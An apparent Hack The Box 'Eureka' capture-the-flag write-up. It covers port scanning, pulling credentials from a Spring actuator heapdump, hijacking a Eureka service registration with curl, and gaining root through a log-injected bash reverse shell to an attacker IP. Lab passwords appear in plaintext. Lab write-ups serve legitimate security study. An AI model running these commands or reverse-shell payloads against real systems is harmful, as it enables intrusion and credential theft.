
![Eureka](https://github.com/user-attachments/assets/8a8de9e7-557e-459b-b6f2-7ae2e9e2ce1b)


from basic nmap scans on provided ip , we came accross this domain 


		 	domain : furni.htb
			 Automatically increasing ulimit value to 5000.
				Open 10.129.178.253:22
				Open 10.129.178.253:80
				Open 10.129.178.253:8761
			Starting Script(s)

ok , perfect , let's head to web enum .So both of 80 and 8761 ports arwe web based , let's ckeck it out

i started to enum using gobuster and light stuffs like ferox one so nothing interesting

i visit host on suggested ports  and here was the point 


#80 port
	Nothing particular , just basic website for selling product

#8761 port
	Seems worth but unhopefully , asking for creds like a pop up directly when reaching the endpoint  furni.htb:8761/
 
![Screenshot_2025-04-28_12_02_33](https://github.com/user-attachments/assets/df573caf-b126-4449-9632-ff68ab311d8f)



so , switching to dirsearch , we found  /actuator path ; sounds like there is a huge file named headdump that takes up to 76MB of storage ; 
	lucky ! i hope , let's get it 

	wget http://furni.htb/actuator/heapdump

file reveals it a :
		heapdump: Java HPROF dump,
ok , for this one i'll use "strings" command and just filtering for commanon strings like 'pass\password\user\token\secret\key'

	strings heapdump|grep -i 'pass\|password\|user\.....'

that's have to be a buntch of output , so let's think about something , i've tried another approach 

	strings heapdump|grep -i 'user=\|pass=\|password=\'

Hooo!!! , we came accross something look interestings , we found some creds that we gonna try right now 

Remember when loading furni.htb on 8761 port it spawn to us entries fields asking for username and password ; let's try out this combination  

so , i went to the website then and submitted creds , but i's a blank page , i also tried it on ssh , and worth !!!!

		ssh user@furni.htb and pass the creds once prompted
![Screenshot_2025-04-28_11_40_51](https://github.com/user-attachments/assets/380d79a7-05ca-4a42-acf7-1afe3ebc4361)

walking around , just found mysql service get started , let's investigate 
![Screenshot_2025-04-28_11_45_28](https://github.com/user-attachments/assets/4fca6a9a-ed1c-4f0a-a392-b816d57eeac7)


![Screenshot_2025-04-28_11_46_32](https://github.com/user-attachments/assets/c7376c4c-846d-4f96-ae62-37a64bb14317)
	
Now , we've checked all we can do , fordward the 8761 onto your localhost host:
		ssh -L 8761:localhost:8761 user@furni.htb
  paste the pass and now access to the web service 

  ![Screenshot_2025-04-28_12_18_29](https://github.com/user-attachments/assets/062285f7-0b87-456c-a8a2-863c93f94f58)

		curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{"instance": {"instanceId": "USER-MANAGEMENT-SERVICE","hostName": "YOURIP","app": "USER-MANAGEMENT-SERVICE","ipAddr": "YOURIP","vipAddress": "USER-MANAGEMENT-SERVICE","secureVipAddress": "USER-MANAGEMENT-SERVICE","status": "UP","port": { "$": 8081, "@enabled": "true" },"dataCenterInfo": {"@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name": "MyOwn"}}}'

#replace the case marked YOURIP with your attacker ip and that's it , you should be able to get it worked
Wait for 2 minutes to get connection in your netcat with credentials, username miranda-
wise and password IL!veT0Be&BeT0L0ve .
Now ssh using those credentials
		ssh miranda-wise@10.10.11.66
		pass : IL!veT0Be&BeT0L0ve
		cat user.txt
#Priviledge Escalation rooting

then in  your attacker machine , setting up a netcat listenner
	nc -nlvp 9999
then in ssh shell of the target
	rm -f /var/www/web/user-management-service/log/application.log;echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/<YOUR-IP>/9999 0>&1)]' >/var/www/web/user-management-service/log/application.log
	
 also be sure to replace YOUR-IP handler with your real one , if you wanna change the port go ahead

	wait until the shell got executed , that should take around 2 minutes i mean so 
 		cat /root/root.txt
   ![Screenshot 2025-05-05 at 05-11-16 Hack The Box Hack The Box](https://github.com/user-attachments/assets/0bf324c9-0f87-4ea1-9646-b0da88325ccf)

#ArtemisTEAM
